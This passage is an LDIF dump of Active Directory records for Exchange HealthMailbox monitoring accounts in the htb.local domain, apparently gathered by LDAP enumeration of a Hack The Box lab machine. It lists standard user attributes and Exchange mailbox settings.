name: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8
objectGUID:: uFrOzTe9IkaZwHcdnjffUw==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132133678056439933
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPcQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: HealthMailbox670628e
sAMAccountType: 805306368
showInAddressBook: CN=All Recipients(VLV),CN=All System Address Lists,CN=Addre
 ss Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=3929e9cb391e403dbd779170005fcdc0-Healt
userPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
mail: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local
msExchVersion: 88218628259840
msExchArchiveGUID:: 2IHsJZMxXUWJxsqge+Hb+w==
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchArchiveDatabaseLink: CN=Mailbox Database 1118319013,CN=Databases,CN=Exch
 ange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First
  Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=lo
 cal
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAABAAIAAQEAAAAAAAUKAAAA
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchPoliciesExcluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchTransportRecipientSettingsFlags: 0
internetEncoding: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 2
msExchMailboxTemplateLink: CN=Default MRM Policy,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchRBACPolicyLink: CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN
 =First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb
 ,DC=local
msExchMailboxGuid:: 9s5pNP6yrkOy6f3rEIfwqw==
msExchTextMessagingState: 302120705
msExchTextMessagingState: 16842751
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
protocolSettings:: UmVtb3RlUG93ZXJTaGVsbMKnMQ==
msExchUMDtmfMap: emailAddress:432584624526967062832433643212233363673232238
msExchUMDtmfMap: lastNameFirstName:4325846245269392401003
msExchUMDtmfMap: firstNameLastName:4325846245269392401003
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 0
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
mDBUseDefaults: TRUE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 549755813888
mailNickname: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8
msExchWhenMailboxCreated: 20190919115645.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1
msExchArchiveName: In-Place Archive -HealthMailbox-EXCH01-003

# HealthMailbox968e74dd3edb414cb4018376e7dd95ba, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox968e74dd3edb414cb4018376e7dd95ba,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: HealthMailbox968e74dd3edb414cb4018376e7dd95ba
distinguishedName: CN=HealthMailbox968e74dd3edb414cb4018376e7dd95ba,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919115656.0Z
whenChanged: 20190919115706.0Z
displayName: HealthMailbox-EXCH01-004
uSNCreated: 25206
uSNChanged: 25221
proxyAddresses: SMTP:HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local
proxyAddresses: SIP:HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local
garbageCollPeriod: 1209600
name: HealthMailbox968e74dd3edb414cb4018376e7dd95ba
objectGUID:: ZLbQKCD4w06mJyr+zwPl+g==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132133678161439690
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPcgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: HealthMailbox968e74d
sAMAccountType: 805306368
showInAddressBook: CN=All Recipients(VLV),CN=All System Address Lists,CN=Addre
 ss Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=9cbd37b3d8484e93985906401227e840-Healt
userPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
mail: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local
msExchVersion: 88218628259840
msExchArchiveGUID:: /S2TUxDn202fQ6X13Sccpw==
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchArchiveDatabaseLink: CN=Mailbox Database 1118319013,CN=Databases,CN=Exch
 ange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First
  Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=lo
 cal
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAABAAIAAQEAAAAAAAUKAAAA
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchPoliciesExcluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchTransportRecipientSettingsFlags: 0
internetEncoding: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 2
msExchMailboxTemplateLink: CN=Default MRM Policy,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchRBACPolicyLink: CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN
 =First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb
 ,DC=local
msExchMailboxGuid:: 2xCh4rQfhEGCA2Yagi8hsQ==
msExchTextMessagingState: 302120705
msExchTextMessagingState: 16842751
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
protocolSettings:: UmVtb3RlUG93ZXJTaGVsbMKnMQ==
msExchUMDtmfMap: emailAddress:432584624526996837433333241422401837637339522
msExchUMDtmfMap: lastNameFirstName:4325846245269392401004
msExchUMDtmfMap: firstNameLastName:4325846245269392401004
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 0
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
mDBUseDefaults: TRUE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 549755813888
mailNickname: HealthMailbox968e74dd3edb414cb4018376e7dd95ba
msExchWhenMailboxCreated: 20190919115656.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1
msExchArchiveName: In-Place Archive -HealthMailbox-EXCH01-004

# HealthMailbox6ded67848a234577a1756e072081d01f, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox6ded67848a234577a1756e072081d01f,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: HealthMailbox6ded67848a234577a1756e072081d01f
distinguishedName: CN=HealthMailbox6ded67848a234577a1756e072081d01f,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919115706.0Z
whenChanged: 20190919115717.0Z
displayName: HealthMailbox-EXCH01-005
uSNCreated: 25217
uSNChanged: 25234
proxyAddresses: SMTP:HealthMailbox6ded67848a234577a1756e072081d01f@htb.local
proxyAddresses: SIP:HealthMailbox6ded67848a234577a1756e072081d01f@htb.local
garbageCollPeriod: 1209600
name: HealthMailbox6ded67848a234577a1756e072081d01f
objectGUID:: yqy2UPQioEmIabhvlhqsLg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132133678265970122
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPcwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: HealthMailbox6ded678
sAMAccountType: 805306368
showInAddressBook: CN=All Recipients(VLV),CN=All System Address Lists,CN=Addre
 ss Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=b85b76489f7943238bdc023354515ea1-Healt
userPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
mail: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local
msExchVersion: 88218628259840
msExchArchiveGUID:: ZsgYiLTSd0+LCkr5AMAD5g==
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchArchiveDatabaseLink: CN=Mailbox Database 1118319013,CN=Databases,CN=Exch
 ange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First
  Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=lo
 cal
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAABAAIAAQEAAAAAAAUKAAAA
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchPoliciesExcluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchTransportRecipientSettingsFlags: 0
internetEncoding: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 2
msExchMailboxTemplateLink: CN=Default MRM Policy,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchRBACPolicyLink: CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN
 =First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb
 ,DC=local
msExchMailboxGuid:: AvP/ydgqAU2I3I5u4wj8IA==
msExchTextMessagingState: 302120705
msExchTextMessagingState: 16842751
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
protocolSettings:: UmVtb3RlUG93ZXJTaGVsbMKnMQ==
msExchUMDtmfMap: emailAddress:432584624526963336784822345772175630720813013
msExchUMDtmfMap: lastNameFirstName:4325846245269392401005
msExchUMDtmfMap: firstNameLastName:4325846245269392401005
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 0
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
mDBUseDefaults: TRUE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 549755813888
mailNickname: HealthMailbox6ded67848a234577a1756e072081d01f
msExchWhenMailboxCreated: 20190919115706.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1
msExchArchiveName: In-Place Archive -HealthMailbox-EXCH01-005

# HealthMailbox83d6781be36b4bbf8893b03c2ee379ab, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox83d6781be36b4bbf8893b03c2ee379ab,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab
distinguishedName: CN=HealthMailbox83d6781be36b4bbf8893b03c2ee379ab,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919115717.0Z
whenChanged: 20190919115727.0Z
displayName: HealthMailbox-EXCH01-006
uSNCreated: 25229
uSNChanged: 25236
proxyAddresses: SMTP:HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local
proxyAddresses: SIP:HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local
garbageCollPeriod: 1209600
name: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab
objectGUID:: cgdzS63kPkeWsSFyl4D/Dw==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132133678370658086
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPdAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: HealthMailbox83d6781
sAMAccountType: 805306368
showInAddressBook: CN=All Recipients(VLV),CN=All System Address Lists,CN=Addre
 ss Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=7fe3e45e103f4a2c85a701da81410349-Healt
userPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
mail: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local
msExchVersion: 88218628259840
msExchArchiveGUID:: YwZ1GGUkp0WlfxybxAMUqQ==
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchArchiveDatabaseLink: CN=Mailbox Database 1118319013,CN=Databases,CN=Exch
 ange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First
  Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=lo
 cal
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAABAAIAAQEAAAAAAAUKAAAA
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchPoliciesExcluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchTransportRecipientSettingsFlags: 0
internetEncoding: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 2
msExchMailboxTemplateLink: CN=Default MRM Policy,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchRBACPolicyLink: CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN
 =First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb
 ,DC=local
msExchMailboxGuid:: h5+Z674RBUyO4qGcs2B7Tg==
msExchTextMessagingState: 302120705
msExchTextMessagingState: 16842751
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
protocolSettings:: UmVtb3RlUG93ZXJTaGVsbMKnMQ==
msExchUMDtmfMap: emailAddress:432584624526983367812336242238893203223337922
msExchUMDtmfMap: lastNameFirstName:4325846245269392401006
msExchUMDtmfMap: firstNameLastName:4325846245269392401006
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 0
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
mDBUseDefaults: TRUE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 549755813888
mailNickname: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab
msExchWhenMailboxCreated: 20190919115716.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1
msExchArchiveName: In-Place Archive -HealthMailbox-EXCH01-006

# HealthMailboxfd87238e536e49e08738480d300e3772, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxfd87238e536e49e08738480d300e3772,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: HealthMailboxfd87238e536e49e08738480d300e3772
distinguishedName: CN=HealthMailboxfd87238e536e49e08738480d300e3772,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919115727.0Z
whenChanged: 20190919115738.0Z
displayName: HealthMailbox-EXCH01-007
uSNCreated: 25242
uSNChanged: 25258
proxyAddresses: SMTP:HealthMailboxfd87238e536e49e08738480d300e3772@htb.local
proxyAddresses: SIP:HealthMailboxfd87238e536e49e08738480d300e3772@htb.local
garbageCollPeriod: 1209600
name: HealthMailboxfd87238e536e49e08738480d300e3772
objectGUID:: ChiUksMz60CXrgHq9e5kWg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132133678474876792
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPdQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: HealthMailboxfd87238
sAMAccountType: 805306368
showInAddressBook: CN=All Recipients(VLV),CN=All System Address Lists,CN=Addre
 ss Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=fe2e1dda3f6d422c80f7cb9bc232f388-Healt
userPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
mail: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local
msExchVersion: 88218628259840
msExchArchiveGUID:: yTPts2YdlkioJOdTMgwDjw==
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchArchiveDatabaseLink: CN=Mailbox Database 1118319013,CN=Databases,CN=Exch
 ange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First
  Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=lo
 cal
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAABAAIAAQEAAAAAAAUKAAAA
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchPoliciesExcluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchTransportRecipientSettingsFlags: 0
internetEncoding: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 2
msExchMailboxTemplateLink: CN=Default MRM Policy,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchRBACPolicyLink: CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN
 =First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb
 ,DC=local
msExchMailboxGuid:: Ve4J8SaMvEeFfZopLsqZ/g==
msExchTextMessagingState: 302120705
msExchTextMessagingState: 16842751
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
protocolSettings:: UmVtb3RlUG93ZXJTaGVsbMKnMQ==
msExchUMDtmfMap: emailAddress:432584624526933872383536349308738480330033772
msExchUMDtmfMap: lastNameFirstName:4325846245269392401007
msExchUMDtmfMap: firstNameLastName:4325846245269392401007
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 0
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
mDBUseDefaults: TRUE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 549755813888
mailNickname: HealthMailboxfd87238e536e49e08738480d300e3772
msExchWhenMailboxCreated: 20190919115727.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1
msExchArchiveName: In-Place Archive -HealthMailbox-EXCH01-007

# HealthMailboxb01ac647a64648d2a5fa21df27058a24, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxb01ac647a64648d2a5fa21df27058a24,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: HealthMailboxb01ac647a64648d2a5fa21df27058a24
distinguishedName: CN=HealthMailboxb01ac647a64648d2a5fa21df27058a24,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919115737.0Z
whenChanged: 20190919115749.0Z
displayName: HealthMailbox-EXCH01-008
uSNCreated: 25253
uSNChanged: 25270
proxyAddresses: SMTP:HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local
proxyAddresses: SIP:HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local
garbageCollPeriod: 1209600
name: HealthMailboxb01ac647a64648d2a5fa21df27058a24
objectGUID:: 8jyevl0GiUqSLk8Nyn8tFA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132133678578785590
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPdgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: HealthMailboxb01ac64
sAMAccountType: 805306368
showInAddressBook: CN=All Recipients(VLV),CN=All System Address Lists,CN=Addre
 ss Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=8f894abc744b43c08ed41ea7dea3b5ee-Healt
userPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
mail: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local
msExchVersion: 88218628259840
msExchArchiveGUID:: CN6R6o7WfESg4f8SO83OkQ==
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchArchiveDatabaseLink: CN=Mailbox Database 1118319013,CN=Databases,CN=Exch
 ange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First
  Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=lo
 cal
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAABAAIAAQEAAAAAAAUKAAAA
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchPoliciesExcluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchTransportRecipientSettingsFlags: 0
internetEncoding: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 2
msExchMailboxTemplateLink: CN=Default MRM Policy,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchRBACPolicyLink: CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN
 =First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb
 ,DC=local
msExchMailboxGuid:: fncFjc27Fkm/zJVAEUICRA==
msExchTextMessagingState: 302120705
msExchTextMessagingState: 16842751
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
protocolSettings:: UmVtb3RlUG93ZXJTaGVsbMKnMQ==
msExchUMDtmfMap: emailAddress:432584624526920122647264648322532213327058224
msExchUMDtmfMap: lastNameFirstName:4325846245269392401008
msExchUMDtmfMap: firstNameLastName:4325846245269392401008
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 0
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
mDBUseDefaults: TRUE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
